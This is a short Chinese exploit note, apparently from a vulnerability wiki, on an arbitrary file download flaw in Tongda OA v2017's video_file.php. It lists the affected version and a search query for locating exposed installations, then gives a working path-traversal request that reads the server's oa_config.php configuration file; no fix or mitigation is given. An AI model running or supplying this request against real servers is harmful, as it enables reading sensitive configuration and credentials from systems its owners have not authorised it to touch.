# 通达OA v2017 video_file.php 任意文件下载漏洞

## 漏洞描述

通达OA v2017 video_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件

## 漏洞影响

<a-checkbox checked>通达OA v2017</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="TDXK-通达OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1657609448877-d05e2d6d-6c83-456d-a088-ee09cea92c30-20220712150651348.png)

验证POC

```php
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php	
```

![img](../../../.vuepress/public/img/1657609468826-7eec4875-7f16-4b37-a13d-2a6e73d2f1ce.png)